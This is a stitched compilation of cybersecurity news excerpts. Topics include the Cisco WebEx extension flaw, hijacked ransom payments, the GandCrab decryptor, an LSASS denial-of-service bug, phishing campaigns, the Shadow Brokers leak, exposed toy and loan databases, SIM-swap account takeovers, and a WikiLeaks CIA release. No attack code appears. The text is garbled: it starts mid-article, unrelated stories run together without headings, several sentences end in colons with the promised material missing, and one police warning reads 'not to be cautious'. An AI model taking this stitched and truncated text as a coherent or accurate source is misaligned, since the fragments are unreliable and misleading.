In oher words, if your organisation uses WebEx, you probably have the browser extension installed, and if you have it installed, you may be at risk.
According to Tavis Ormandy at Google’s Project Zero, who discovered and documented the bug, there are more than 20 million WebEx users worldwide.
According to Cisco, Internet Explorer, Chrome and Firefox on Windows are affected.
Microsoft Edge on Windows and all browsers on Mac and Linux are safe.
The most recent update for Chrome is Cisco WebEx extension 1.0.7.
Cisco published a notification about this update at 2017-01-26T19:45Z, having issued and then withdrawn 1.0.3 and then 1.0.5 earlier this week after deeming them “incomplete”.
However, at 2017-01-26T19:45Z, Cisco’s official Security Advisory page says:
Cisco is currently developing updates that address this vulnerability for Firefox and Internet Explorer.
There are no workarounds that address this vulnerability.
Using Microsoft Edge on Windows or any browser on Mac or Linux will shield you from this bug because it doesn’t apply on those platforms.

A Tor proxy service is being used by crooks to divert ransom payments to their own accounts at the expense of ransomware distributors -- and their victims, according to security researchers.
 Ransomware distributors expecting an easy payday are having their illicit earnings stolen by other cybercriminals, who are hijacking the ransom payments before they're received and redirecting them into their own bitcoin wallets.
But not only are the attacks giving criminals a taste of their own medicine in becoming victims of cyber-theft, they are also preventing ransomware victims from unlocking their encrypted files -- because, as far as those distributing the malware are concerned, they never received their ransom payment.
 Uncovered by researchers at Proofpoint, it's believed to be the first scheme of its kind, with cybercriminals using a Tor proxy browser to carry out man-in-the-middle attacks to steal the cryptocurrency payments, which victims of ransomware are attempting to send to their attackers.
The attacks take advantage of the way ransomware distributors request victims to use Tor to buy the cryptocurrency they need to make the ransom payment. While many ransomware notes provide instructions on how to download and run the Tor browser, others provide links to a Tor proxy -- regular websites that translate Tor traffic into normal web traffic -- so the process of paying is as simple as possible for the victim.
However, one of the Tor gateways being used is altering bitcoin wallet addresses in the proxy, and redirecting the payment into other accounts, rather than those of the ransomware attacker.
 Meanwhile, those behind Magniber ransomware appear to have moved to combat bitcoin address replacement by splitting the HTML source code of wallets into four parts, thus making it harder for proxies to find the address to change.
While the sums of bitcoin stolen don't represent a spectacular haul, the interception attacks do create problems for ransomware distributors -- and their victims.
The victims are the ultimate losers in this scenario. Not only are they paying hundreds or even thousands of dollars to in ransom demands, they're not even getting their files back in return because the man-in-the-middle attacks mean the ransomware distributors don't think they've been paid.

Victims of one the newest - and most unusual - families of ransomware could now be able to recover their files without giving into the demands of criminals because decryption tools have been released for free.
A GandCrab ransomware decryption tool has been released as part of the No More Ransom initiative, following a combined operation by Bitdefender, the Romanian Police, the Directorate for Investigating Organized Crime and Terrorism (DIICOT) and Europol.
GandGrab first appeared in January and has already claimed over 53,000 victims around the world, making it what Europol describe as ""one of the most aggressive forms of ransomware so far this year"" costing each victim anything from a few hundred dollars to a few thousand.
This variant of the file-locking malware is unusual in a number of ways: not only is it spread via the use of exploit kits - a tactic usually reserved for the likes of trojans and cryptocurrency miners - it is also the first form of ransomware to ask for payments in Dash. Most other forms of ransomware demand the ransom be paid in bitcoin or Monero.
The spread of GandGrab has also been helped along by a cybercrime-as-a-service scheme which offers a toolkit for deploying the ransomware in exchange for wannabee crooks giving the original authors a cut of their profits.
It's unknown which specific cybercriminal operation is behind GandGrab. However, the ransomware is advertised on Russian hacking forums, with the authors explicitly instructing those who become a part of the partnership scheme not to target Russia or any other country in the Commonwealth of Independent States of former Soviet republics.
But regardless of who might be distributing GandCrab, now victims don't need to pay a ransom to those looking to cash in on it, because the decryption tool is available for free from the No More Ransom portal and from Bitdefender.
""Ransomware has become a billion-dollar cash cow for malware authors, and GandCrab is one of the highest bidders,"" said Catalin Cosoi, senior director of the investigation and forensics unit at Bitdefender.
In order to help prevent falling victim to ransomware, Bitdefender recommends regularly back-up sensitive data and to be wary of suspicious email attachments and malicious links.
Launched in 2016, the No More Ransom scheme brings law enforcement and private industry together in the fight against cybercrime and has helped thousands of ransomware victims retrieve their encrypted files without lining the pockets of crooks.
The portal is available in 29 languages and since its launch has has received over 1.6 million visitors from a total of 180 countries.
The release of GandCrab decryption tools comes shortly after an operation involving Europol, the Belgian National Police and Kaspersky Lab led to the release of free decryption tools for Cryakl ransomware.

In November 8, 2016 Microsoft released a security update for Windows Authentication Methods (MS16-137) which included 3 CVEs:
Talking specifically about CVE-2016-7237, this fix was applied to ""lsasrv.dll"", which affected the LSASS service.
The vulnerability affected all Windows versions, either 32 or 64 bits, and was reported and later described in more detail by Laurent Gaffié (@PythonResponder) the same day that the fix was published.
He also published proof-of-concept (PoC) code triggering the vulnerability.
When the LSASS service crashes, the target is automatically restarted after 60 seconds, which is not very nice when it's a production server.
As this allocation is close to 4GB, this will probably fail.If the allocation fails, one of the necessary conditions to reproduce the NULL-Pointer dereference will be reached.
There was a misunderstanding here about the vulnerability, because according to the PoC released by Laurent Gaffié, the problem WASN'T in the structure pointer, but rather in one field of the CRITICAL_SECTION object pointed by this structure, which is NULL when the huge allocation fails !
To be clear, the check of the NULL pointer should probably have been here:
Although the public PoC doesn't trigger the vulnerability in Windows 8.1 or Windows 10, the researcher and Microsoft declared these Windows versions as vulnerable.
As I said before, the ""NegGetExpectedBufferLength"" function reads the evil size from the SMB packet.
Now, this function has to return the 0x90312 value (SEC_I_CONTINUE_NEEDED) to produce the fail in the huge allocation.
Unfortunately, in the latest Windows versions, an extra check was added in this function which compares the evil size against 0xffff (64KB).
If the evil size is greater, this function won't return the 0x90312 value, but rather this will return the 0xC00000BB value (STATUS_NOT_SUPPORTED), which won't produce any allocation fail resulting in the vulnerability not being triggered.
On the other hand, if we use the evil size with a value less or equal than 0xffff (64KB), the allocation won't fail and again, the vulnerability won't be triggered.
So, why are Windows 8.1 and Windows 10 vulnerable?
Although the bug is triggered when a memory allocation fails, that doesn't mean that the allocation has to be giant, but rather that the LSASS service doesn't have enough available memory to allocate.
I had been able to confirm that this vulnerability can be triggered in Windows 7 and 2008 R2 by establishing several SMB connections and sending evil sizes with values like 0x1000000 (16 MB).
The problem is that in the case of the latest Windows versions, it's not possible to use this kind of sizes, because as I said before, the limit is 64KB.
So, the only way to trigger this vulnerability should be by producing a memory exhaustion in the LSASS service.
It may be possible to do so by finding a controllable malloc in the LSASS authentication process, creating multiple connections and producing a memory exhaustion until the ""LsapAllocateLsaHeap"" function fails.
Maybe, this memory exhaustion condition could be easily reached in local scenarios.
I realized that the fix wasn't working when I tried to understand why the public PoC wasn't working against Windows 10.
It's surprising to see that nobody else noticed that –that we know of-, and that a considerable amount of Windows users have been unprotected for more than 2 months since the public exploit was released.
As of January 10th, Microsoft decided to release a new security bulletin including a patch for the affected systems (MS17-004).
If we diff against the latest ""lsasrv.dll"" version (v6.1.7601.23642), we can see that the vulnerability was fixed by changing the ""NegGetExpectedBufferLength"" function.
Basically, the same 64KB packet size check used by Windows 8.1 and Windows 10 was now added to the rest of the Windows versions.

The SANS Internet Storm Center published a warning on Wednesday about an active phishing campaign that utilizes PDF attachments in a novel ploy to harvest email credentials from victims.
According to the SANS bulletin, the email has the subject line “Assessment document” and the body contains a single PDF attachment that claims to be locked.
A message reads: “PDF Secure File UNLOCK to Access File Content”.
Clicking on a link to unlock the document opens the PDF document using the computer’s default viewer.
A dialogue box then appears above the PDF prompting the user to input their email address and password.
They are not going after the most sophisticated users.
They are going after Joe Cubicle that may not think twice about entering credentials to unlock a PDF,” said John Bambenek, handler at SANS Internet Storm Center.
Bambenek suspects that attackers are harvesting credentials in hopes of gaining a small foothold into a company via an email account or to perpetuate further phishing scams.
The email says it’s from VetMeds and the PDF is identified as a VetMeds assessment.
Once opened, the contents of the one-page PDF indicates that the document is a SWIFT (Society for Worldwide Interbank Financial Telecommunication) banking transaction.
“It doesn’t matter what email address or password you input into the fake unlocking mechanism.
The document is opened and anything you input is transmitted to the spammer,” Bambenek said.

Staff are still falling for phishing scams, with social media friend requests and emails pretending to come from the HR department among the ones most likely to fool workers into handing over usernames and passwords.
Phishing scams aim to trick staff into handing over data -- normally usernames and passwords -- by posing as legitimate email. It's a technique used by the lowliest criminals as part of ransomware campaigns, right up to state-backed hackers because it continues to be such an effective method.
In a review of 100 simulated attack campaigns for 48 of its clients, accounting for almost a million individual users, security company MWR Infosecurity found that sending a bogus friend request was the best way to get someone to click on a link -- even when the email was being sent to a work email address.
Almost a quarter of users clicked the link to be taken through to a fake login screen, with more than half going on to provide a username and password, and four out of five then going on to download a file.
A spoof email claiming to be from the HR department referring to the appraisal system was also very effective: nearly one in five clicked the link, and three-quarters provided more credentials, with a similar percentage going on to download a file.
Some might argue that gaining access to a staff email account is of limited use, but the security company argues that this is a handy for an assault. A hacker could dump entire mailboxes, access file shares, run programs on the compromised user's device, and access multiple systems, warned MWR InfoSecurity. Even basic security controls, such as two-factor authentication or disabling file and SharePoint remote access, could reduce the risk.
The company also reported bad news about the passwords that users handed over: while over 60 percent of passwords were found to have a length of 8 to 10 characters -- the mandatory minimum for many organizations -- the company argued that this illustrates how users stick to minimum security requirements. A third of the passwords consisted of an upper-case first letter, a series of lower-case letters, and then numbers with no symbols.
It also found that 13.6 percent of passwords ended with four numbers in the range of 1940 to 2040. Of those, nearly half ended in 2016, which means one-in-twenty of all passwords end with the year in which they were created.

The mysterious group that claims to have stolen digital weapons once used by the National Security Agency published a trove of active Microsoft Windows software exploits on Thursday.
The code dump, accompanied by a farewell message written in broken English by the enigmatic group the Shadow Brokers, confirms claims implicit in an earlier post Sunday.
While the prior message showed filenames, directories and screenshots — implying the existence of these capabilities — along with an associated price tag, today’s download provides functional code.
Of the 61 files provided in total in the newly released set, only one had ever been catalogued by anti-virus databases, based on a VirusTotal scan conducted earlier Thursday morning.
The files contain user mode and kernel mode modules.
Notably, the one tool effectively recognized by the virus scanner avoided detection from Malwarebytes, Panda, Comodo and Fortinet products, said Rendition Infosec founder Jake Williams.
In their supposed final message, the ShadowBrokers say they are “making [an] exit” and “going dark”— although an associated bitcoin wallet will remain open for new bids.
The group claims it will come out of hiding to provide the remaining stolen hacking tools only upon receiving 10,000 bitcoin, or $8.13 million worth of the anonymous currency.
Cybersecurity experts tell CyberScoop the exploits are outdated because they are designed to work against old versions of Microsoft operating systems.
“This dump contains Windows Implants and not Unix tools, reinforcing the insider theory.
And the outdated Windows target of those implants reinforce the opinion that Shadow Brokers only has old dirt,” said Matt Suiche, founder of United Arab Emirates-based cybersecurity startup Comae Technologies.
“There is no reason to have all the tools of every platforms etc.
The exploits can be understood as highly advanced hacking tools that were likely developed and deployed by a sophisticated adversary, like an intelligence service, explained Michael Zeberlein, director of intelligence analysis with Area 1 Security.
“They’re basically enterprise class IT infrastructure and systems management functions applied in an offensive fashion.
They would help you get very granular control of computers and servers running in an enterprise environment, an entire organization,” Zeberlein told CyberScoop.
“Really, these tools provide incredible capability”.
“There’s no doubt that this is Equation Group’s stuff based on old reporting,” said Zeberlein.
A meticulous analysis associated with Sunday’s blog post suggests that the leaked information likely came from an insider, rather than a hacker with access to a compromised attack server, based on file configurations, CyberScoop first reported.
“Attackers and defenders around the globe will be reverse engineering these to repurpose [attacks] and create defenses,” Williams said.
“This data, it’s a big deal … because it includes information related to client and server components, which will basically help [intelligence analysts] trace old breaches back to the Equation Group,” a former U.S. intelligence official told CyberScoop on the condition of anonymity.
The Shadow Brokers first emerged on social media in August by similarly dumping operational code for a cohort of old firewall exploits that targeted vulnerabilities in Cisco, Fortinet and Juniper Networks products.
Because the source code for these firewall exploits was provided in a public forum, random hackers began using the tools themselves.
“While we cannot surmise the attacker’s [Shadow Brokers] identity or motivation nor where or how this pilfered trove came to be, we can state that several hundred tools from the leak share a strong connection with our previous findings from the Equation Group,” Kaspersky Lab researchers, many of whom originally helped identify Equation Group’s existence in 2015, wrote in a company blog post in August.
The Equation Group is believed to have ties to the NSA.

BT MAIL users should be on alert as a new email scam is discovered which could be used to gain access to personal details.
Users of BT’s popular email service should be aware of a new scam which is targeting customers across the UK.
The latest threat, which was unleashed over the weekend, suggests that customers’ bills are overdue and need to be paid as soon as possible.
The full message reads, “Your latest bill is now overdue. You can view it online at My BT or on the app. To log in, you'll need your BT ID. This is usually your email address.
“You need to pay it as soon as possible to avoid service intreruption!”
This scam then attempts to trick users by suggesting they should click a link to pay their outstanding bill.
There’s plenty of warning signs about this message including obvious spelling errors and the fact there’s no official BT branding on the email.
Another reason why this is clearly a fake is that it's been sent to people who don't even use BT as their email provider.
One person hit by the scam told Express.co.uk that they received the email on Sunday and have never had a BT broadband or BT email account.
UK Police have also sent out an alert warning BT customers about this latest scam and advising them not to be cautious when clicking in links embedded within emails.
In a tweet Warwickshire Police said they had “received an email from BT re an outstanding bill today - there are links on it to pay the bill.
""This is an obvious scam,"" the message on Twitter continued.
""Please if you receive a similar one DO NOT CLICK ON THE LINKS - BT have been made aware.""
Express.co.uk has contacted BT for comment on this latest scam.
BT has plenty of advice on its website about staying safe online.
The broadband supplier states that internet scams can take many forms, from 'phishing', where a fake email or web site will try to get you to part with your bank account information, to scams pretending to be from online auction, job or other websites that try to collect your personal data.
Not sure if an email you've received is genuine? Don't click on it, and never give out your account or bank details.
Stay safe by being aware of ""phishing"" and other scams that might find their way into your inbox.

A maker of Internet-connected stuffed animal toys has exposed more than 2 million voice recordings of children and parents, as well as e-mail addresses and password data for more than 800,000 accounts.
He said searches using the Shodan computer search engine and other evidence indicated that, since December 25 and January 8, the customer data was accessed multiple times by multiple parties, including criminals who ultimately held the data for ransom.
The recordings were available on an Amazon-hosted service that required no authorization to access.
The data was exposed by Spiral Toys, maker of the CloudPets line of stuffed animals.
The toys record and play voice messages that can be sent over the Internet by parents and children.
The MongoDB database of 821,296 account records was stored by a Romanian company called mReady, which Spiral Toys appears to have contracted with.
Hunt said that, on at least four occasions, people attempted to notify the toy maker of the breach.
In any event, evidence left behind by the ransom demanders made it almost certain company officials knew of the intrusions.
Hunt wrote:
It's impossible to believe that CloudPets (or mReady) did not know that firstly, the databases had been left publicly exposed and secondly, that malicious parties had accessed them.
Obviously, they've changed the security profile of the system, and you simply could not have overlooked the fact that a ransom had been left.
So both the exposed database and intrusion by those demanding the ransom must have been identified yet this story never made the headlines.

A month later, a researcher found that an Internet-connected Barbie doll made by Mattel contained vulnerabilities that might allow hackers to intercept real-time conversations.
In addition to storing the customer databases in a publicly accessible location, Spiral Toys also used an Amazon-hosted service with no authorization required to store the recordings, customer profile pictures, children's names, and their relationships to parents, relatives, and friends.
In Monday's post, Hunt acknowledged the help of Motherboard reporter Lorenzo Franceschi-Bicchierai, who published this report.
Oddly enough, for a product with such lax security, the service used the ultra-secure bcrypt hashing function to protect passwords.
Unfortunately, CloudPets had one of the most permissive password policies ever.
It allowed, for instance, a passcode of the single character ""a"" or the short keyboard sequence ""qwe.""
""What this meant is that when I passed the bcrypt hashes into [password cracking app] hashcat and checked them against some of the world's most common passwords ('qwerty,' 'password,' '123456,' etc.)
along with the passwords 'qwe' and 'cloudlets,' I cracked a large number in a very short time,"" Hunt wrote.

According to Darin Stanchfield, KeepKey founder and CEO, the attack took place on Christmas Day, December 25, when an unknown attacker had activated a new phone number with Stanchfield's Verizon account.
This allowed the attacker to request a password reset for his Verizon email account, but receive the password reset details on the newly activated phone number.
A few minutes later, the attacker had taken over Stanchfield's email account and proceeded to request password resets for several services where the KeepKey founder had used that email address to register profiles.
In no time, the attacker had taken over several of Stanchfield's accounts on other sites, such as KeepKey's official Twitter account, and several of KeepKey's side services, such as accounts for sales distribution channels and email marketing software.
In less than an hour after the attack started, the KeepKey CEO had discovered what happened and started working with his staff to regain access to the hijacked accounts, while also blocking the intruder from reaching other KeepKey services.
The attacker also contacted the KeepKey staff, offering to provide details about how he hacked the Verizon email account and what he stole.
The attacker had also promised to return the stolen data and keep quiet about the hack if KeepKey would agree to pay him 30 Bitcoin (~$30,000).
Instead of paying the ransom demand, the KeepKey team managed to stall the attacker for two more hours, during which time they regained access to all but one account, the company's Twitter profile.
Since the night of the hack, the company has filed a complaint with the FBI and is now offering the 30 Bitcoin ransom as a reward for any clues that lead to the attacker's arrest.
KeepKey was adamant about the attacker not being able to access any of its customers' Bitcoin access keys stored on its devices.
KeepKey is known in the Bitcoin market for manufacturing hardware devices that allow users to store the access keys used to authenticate on Bitcoin wallets.
The device, which is a modified USB storage unit, works offline and the keys on it can be accessed only with physical access to the device.
In the Christmas security breach, the attacker would have only managed to steal home addresses, emails, and phone numbers from users that have bought KeepKey devices in the past, and not the content of those devices.
It is unknown at the time of writing if the attacker used the access over these accounts to steal any KeepKey customer data.
Nevertheless, as a precautionary measure, the company is offering a 30-day refund policy to all customers that had their details stored in the sales distribution channels and email marketing software accounts that the attacker managed to gain access to.
At the start of December, someone had taken over the mobile number of Bo Shen, the founder of Bitcoin venture capital firm Fenbushi Capital, and had stolen at least $300,000 worth of Augur and Ether cryptocurrency.
Two weeks later, the same hacker took over a mobile number for one of the Ethereum Project's admins and used it to reset the passwords for various accounts, eventually downloading a copy of Ethereum forum database backup, dated to April 2016.
At the time of writing, there are no clues that link the first two attacks with the security breach at KeepKey, despite the similar hacking methods.

Phishing takes place when a fraudster tricks an individual into sharing sensitive information (account numbers, Social Security numbers, login credentials, etc.) by way of fraudulent emails, texts, or counterfeit websites. Phishing can also enable a scammer to gain access to a computer or network so that they can install malware, such as ransomware, on a victim's computer. Phishers are able to achieve this by spoofing the familiar, trusted logos of established, legitimate companies. Or, they may pose as a friend or family member and are often successful in completely deluding their targets. 
    In carrying out attacks, Dark Caracal uses trojanized WhatsApp and Facebook apps to try to lure users into clicking malicious links and downloading Android malware, called Pallas, which can collect vast amounts of data.

    Gmail’s new Confidential Mode may invite link-baiting phishing attacks. According to analysis by ComputerWorld, “Confidential Mode works by storing your email in a secure space on Google servers in the cloud. When both sender and recipient use Gmail, the email appears normal. But recipients who do not use Gmail get a link for viewing the email in a browser. The messages you send or receive via Confidential Mode are not actually email. The link is an email, but the message is an email-looking page on the internet that’s password-protected. Emails containing the link can, in fact, be forwarded, but only the intended recipient can successfully open the link. When someone gets one of these forwarded mails, they’re prompted for their Google login username and password to determine whether or not they’re the intended recipient. This is problematic, because it invites link-baiting phishing attacks, which could con people into revealing their login information.”

Ebay customers need to be extra cautious when accessing their account activity, personal information, and messages stored on Ebay.
Sources recently pointed out to us that many pages on the site, which require user input or contain their personal info, are not HTTPS encrypted.
Ebay uses mixed web page content, meaning some pages use encrypted connections while others do not.
As a standard best practice, all pages that either require user input or contain personal data should be HTTPS-encrypted.
While Ebay does use HTTPS on its most critical pages, such as those where payment or address information is entered, it lacks encryption on several less critical, but still sensitive pages.
When customers send and receive messages from sellers, for example, their communications are not sent over a private channel.
Not only could a hacker intercept and read messages, they could modify them in what’s known as a “man-in-the-middle” attack.
This could lead to fraud or spam being sent from user accounts.
Ebay does block certain types of information from being exchanged over its internal messages system.
It’s member-to-member contact policy states:
We also don’t allow members to exchange email addresses, phone numbers or other contact information, web addresses, or links within eBay messaging systems.
This is primarily to prevent buyers and sellers from arranging transactions outside of the Ebay system.
It does help protect user privacy to a degree, but it’s only a half measure compared to the full channel encryption provided by HTTPS.
The entire My Ebay dashboard lacks HTTPS encryption.
This includes account activity, details, settings, preferences, and more.
Much of the personal information on these pages is obfuscated; for example, my email is shown as “p…f@gmail.com” instead of the full email address.
All secret questions are shown in full, for example, though not their answers.
Still, if a hacker knew secret questions in advance, he or she could probably dig around for the answers.
Info about friends, pets, and family are probably not so hard to come by.
Once that’s done, the hacker can change the user’s password and take over their account.
Everything you buy, sell, and watch can be viewed by hackers.

Researchers said good social engineering and users’ trust in the convenience afforded by the OAUTH mechanism guaranteed Wednesday’s Google Docs phishing attacks would spread quickly.
Google said that up to 1 million Gmail users were victimized by yesterday’s Google Docs phishing scam that spread quickly for a short period of time.
In a statement, Google said that fewer than 0.1 percent of Gmail users were affected; as of last February, Google said it had one billion active Gmail users.
Google took measures to protect its users by disabling offending accounts, and removing phony pages and malicious applications involved in the attacks. Other security measures were pushed out in updates to Gmail, Safe Browsing and other in-house systems.
“We were able to stop the campaign within approximately one hour,” a Google spokesperson said in a statement. “While contact information was accessed and used by the campaign, our investigations show that no other data was exposed. There’s no further action users need to take regarding this event.”
The messages were a convincing mix of social engineering and abuse of users’ trust in the convenience of mechanisms that share account access with third parties.
Many of the phishing messages came from contacts known to victims since part of the attack includes gaining access to contact lists. The messages claimed that someone wanted to share a Google Doc with the victim, and once the “Open in Docs” button in the email is clicked, the victim is redirected to a legitimate Google OAUTH consent screen where the attacker’s application, called “Google Docs” asks for access to victim’s Gmail and contacts through Google’s OAUTH2 service implementation.
While the ruse was convincing in its simplicity, there were a number of red flags, including the fact that a Google service was asking for access to Gmail, and that the “To” address field was to an odd Mailinator account.
Google also quickly updated Safe Browsing and Gmail with warnings about the phishing emails and attempts to steal personal information.
The phishing emails spread quickly on Wednesday and likely started with journalists and public relations professionals, each of whom are likely to have lengthy contact lists ensuring the messages would continue to spread in an old-school worm-like fashion.

OAUTH’s open nature allows anyone to develop similar apps. The nature of the standard and interaction involved makes it difficult to safely ask for permission without giving the users a lot of information to validate whether an app is malicious, said Duo’s Sokley.
“There are many pitfalls in implementing OAUTH 2.0, for example cross site request forgery protection (XSRF). Imagine if the user doesn’t have to click on the approve button, but if the exploit would have done this for you,” said SANS’ Ullrich. “OAUTH 2.0 also inherits all the security issues that come with running anything in a web browser. A user may have multiple windows open at a time, the URL bar isn’t always very visible and browser give applications a lot of leeway in styling the user interface to confuse the user.”

Avast revealed the findings of its research experiment into smart devices, including public and private webcam vulnerabilities in Spain, and, specifically, in Barcelona.
Avast identified more than 22,000 webcams and baby monitors in the city that are vulnerable to attack, which means that cybercriminals could livestream the videos directly to the Internet.
The findings identified more than 493,000 smart devices in Barcelona and 5.3 million in Spain overall – including smart kettles, coffee machines, garage doors, fridges, thermostats and other IP-connected devices – that are connected to the internet and vulnerable to attacks.
In the experiment, Avast found:
Conducted in partnership with IoT search engine Shodan.io, the experiment proves just how easy it is for anyone – including cybercriminals – to scan IP addresses and ports over the Internet and classify what device is on each IP address.
And, with a little extra effort and know-how, hackers can also find out the type of device (webcam, printer, smart kettle, fridge and so on), brand, model and the version of software it is running.
As webcams and other devices are vulnerable, there are a range of security, legal and privacy concerns to be addressed.
Snoopers could easily access and watch Mobile World Congress visitors and Barcelona residents in private and public spaces, and stream the video directly to the internet, or turn the device into a bot.
Smart device manufacturers also collect and store private user data, including behavioral data, contact information, and credit card details, which poses an additional risk if intercepted by cybercriminals.
And while the problem is in no way confined to Barcelona, Spain, or indeed to webcams, it is particularly challenging for the city as it is hosting thousands of mobile and technology industry executives at Mobile World Congress 2017 this week.
When a device is infected, it can also be used to infect other devices, to add them to a botnet, or to take control over them and do harm to their owner.
This includes kitchen and other household devices, to which cybercriminals can give remote orders, for example, to heat up water in a kettle.

Some medical devices, smartphones and internet of things gadgets contain certain types of sensors that are vulnerable to potential hacking using sound waves, says cybersecurity researcher Kevin Fu.
""This is now a risk that all manufacturers should be aware of, and in their hazard analysis, it has to be a part of their cybersecurity risk management,"" says Fu, explaining findings of a recent research study conducted by the University of Michigan and the University of South Carolina.
The microelectromechanical systems - or MEMS accelerometers - that the research team found to contain these vulnerabilities - are sensors used in various devices to measure acceleration or velocity, and then report those readings to a microprocessor.
""What we looked at was the ability to trick these sensors into delivering false readings to the microprocessor by using sound waves,"" he says in an interview with Information Security Media Group.
""What medical devices contain these sensors is still an open question.
The main hazard of this sound wave vulnerability is the threat to the integrity and availability of the sensor, he explains.
Prior studies by other researchers had found that sound waves can be used to disable these sensors.
""What's new here is that it is now known that one can actually damage the integrity of the reading,"" he says.
""If you were trusting this reading to do something automated, such as rate-adapt a pacemaker, perhaps based on changing activity of a patient, you now need a second way to verify the integrity of that reading.""
The study lists 20 accelerometers for which the researchers were able to change the output of the sensors using sound waves, Fu says.
""In some devices, we found that there is a speaker built in right next to the sensor, which means there is a remote ability to cause these changes without an adversary being near the chip.""
Fu recommends that manufacturers assess the researchers' list of accelerometers that contain the sound wave vulnerability ""and ask [suppliers] for specific parameters, including the resident frequencies, to understand the risks and mitigations.""

Google's Project Zero has again called Apple out for silently patching flaws.
Apple has secretly patched a bunch of high-severity bugs reported to it by Google's Project Zero researchers.
The move has resulted in Google's Project Zero once again calling Apple out for fixing iOS and macOS security flaws without documenting them in public security advisories.
While it's good news that Apple beat Project Zero's 90-day deadline for patching or disclosing the bugs it finds, the group's Ivan Fratric recently argued that the practice endangered users by not fully informing them why an update should be installed.
This time the criticism comes from Project Zero's Ian Beer, who's been credited by Apple with finding dozens of serious security flaws in iOS and macOS over the years.
Beer posted a blog about several vulnerabilities in iOS 7 he found in 2014 that share commonalities with several bugs he has found in iOS 11.4.1, some of which he's now released exploits for.
Beer notes that none of the latest issues is mentioned in the iOS 12 security bulletin even though Apple did fix them. The absence of information about them is a ""disincentive"" for iOS users to patch, Beer argues. 
""Apple are still yet to assign CVEs for these issues or publicly acknowledge that they were fixed in iOS 12,"" wrote Beer.
""In my opinion a security bulletin should mention the security bugs that were fixed. Not doing so provides a disincentive for people to update their devices since it appears that there were fewer security fixes than there really were.""
In other instances, such as one macOS bug Beer reported, Apple did actually assign a CVE, but it still hasn't updated the relevant security bulletin to reflect the fix.
Apple similarly allocated CVE-2018-4337 to another high-severity iOS bug, which was fixed in iOS 12, but isn't currently acknowledged in the iOS 12 security bulletin.
In another case, Apple fixed a bug that affected iOS and macOS but didn't assign a CVE or mention it in the security bulletins.
Not only may it be a disincentive for end-users to patch iPhones and Macs, but Beer also points out in another bug report that the lack of public acknowledgement by Apple means he has no way of knowing whether the issue is a duplicate that another researcher may have already found.
As he notes in the blog, many of the bugs he has found in iOS are very similar or the same as bugs found by noted jailbreaking hackers Pangu Team.

The US Postal Service says it’s fixed a security weakness on usps.com that let anyone see the personal account info of its users, including usernames and street addresses. The open vulnerability was reportedly identified over a year ago by an independent researcher but USPS never patched it until this week, when Krebs on Security flagged the issue.
The vulnerability included all 60 million user accounts on the website. It was caused by an authentication weakness in the site’s application programming interface (API) that allowed anyone to access a USPS database offered to businesses and advertisers to track user data and packages. The API should have verified whether an account had permissions to read user data but USPS didn’t have such controls in place.
Users’ personal data including emails, phone numbers, mailing campaign data were all exposed to anyone who was logged into the site. Additionally, any user could request account changes for another user, so they could potentially change another account’s email address and phone number, although USPS does at least send a confirmation email to confirm the changes.
Since street addresses are searchable through the database, any logged-in user could see who was living at each residence and even gain the data of multiple people in the same household. Krebs notes that because of the vulnerability, “no special hacking tools were needed to pull this data.”
USPS said in a statement to Krebs: “Any information suggesting criminals have tried to exploit potential vulnerabilities in our network is taken very seriously. Out of an abundance of caution, the Postal Service is further investigating to ensure that anyone who may have sought to access our systems inappropriately is pursued to the fullest extent of the law.” A recent audit of its system in October did not turn up this vulnerability, although it did find numerous other weaknesses. We’ve reached out for comment on whether USPS was aware of the issue when it was initially noted over a year ago. So far, no known exploits were made through this vulnerability.
In USPS’ continued efforts to modernize and adapt to the digital age, it’s faced numerous cybersecurity challenges.

A California financing company exposed up to 1 million records online that contained names, addresses, fragments of Social Security numbers and data related to vehicle loans, according to a researcher's report. 
The data comes from Alliance Direct Lending, which is based in Orange, California, writes Bob Diachenko, who works with the security research team at Kromtech Alliance Corp. of Germany. Alliance Direct Lending specializes in refinancing auto loans at a lower interest rate, and it also has partnerships with dealers across the country. 
""It is unclear if anyone other than security researchers accessed it or how long the data was exposed,"" Diachenko writes in a blog post. 
Security researchers, as well as hackers, have had a field day lately exposing configuration mistakes organizations have made when setting up databases. Despite a string of well-publicized findings, the errors are still being made, or at least, not being caught. Aside from breaches, other organizations have seen their data erased and held for ransom, with notes left inside the databases asking for bitcoins (see Database Hijackings: Who's Next?). 
Kromtech notified Alliance, which has since taken the data offline, Diachenko writes. Information Security Media Group's efforts to reach Alliance officials were not immediately successful. Under California's mandatory data breach notification law, Alliance would be required to report the breach. 
""The IT administrator claimed that it had only recently been leaked and was not was not up for long,"" Diachenko writes. ""He thanked us for the notification and the data was secured very shortly after the notification call."" 
Researchers came across the data while looking into Amazon Web Services Simple Storage Service (S3) ""buckets,"" which is the term for storage instances on the popular cloud hosting service. They were specifically hunting for buckets that had been left online but required no authentication. 
The bucket contained 1,000 items, of which 210 were public. The leaked data included .csv files listed by dealerships located around the country. The number of consumer details leaked ranges between 550,000 up to 1 million, Diachenko writes. A screenshot posted on Kromtech's blog shows a sampling of the dealerships affected. 
Kromtech shared with ISMG a data sample pertaining to a dealership in Michigan. It shows full names, addresses, ZIP codes, what appear to be FICO credit scores, an annual percentage rate and the last four digits of Social Security numbers. 
""The danger of this information being leaked is that cybercriminals would have enough to engage in identity theft, obtain credit cards or even file a false tax return,"" Diachenko writes. 
While full Social Security numbers weren't exposed, there's still a risk in leaking the last four digits. When trying to verify customers' identities, companies will sometimes ask for a fragment of data. So for fraudsters compiling dossiers, every bit, however incomplete, helps. 
Also exposed were 20 phone call recordings with customers who were negotiating auto loan deals. 
""These consent calls were the customers agreeing that they understood they were getting an auto loan, confirming that the information was correct and true,"" Diachenko writes. ""They included the customer's name, date of birth, social security numbers, and phone numbers."" 
The bucket was last modified on Dec. 29, 2016, Kromtech writes. 
Amazon has strong security built around S3 storage, so it would appear that whomever created the bucket might have disabled its controls. According to Amazon's guidance, ""only the bucket and object owners originally have access to Amazon S3 resources they created."" 
Amazon also has identity and access management controls that can be used to carefully restrict who can access and change data. Buckets can also be made off-limits based on HTTP referrers and IP addresses.

WikiLeaks is posting thousands of files Tuesday the organization says detail the CIA’s efforts to surveil overseas targets by tapping otherwise ordinary devices that are connected to the Internet.
The anti-secrecy group launched a “new series of leaks,” this time taking aim at the CIA’s Center for Cyber Intelligence, which falls under the agency’s Digital Innovation Directorate.
The group maintains the CIA’s center lost control of its hacking arsenal, including malware, viruses, trojans, weaponized ""zero day"" exploits, malware remote control systems and associated documentation, and is posting what it calls the ""largest-ever publication of confidential documents on the agency.""
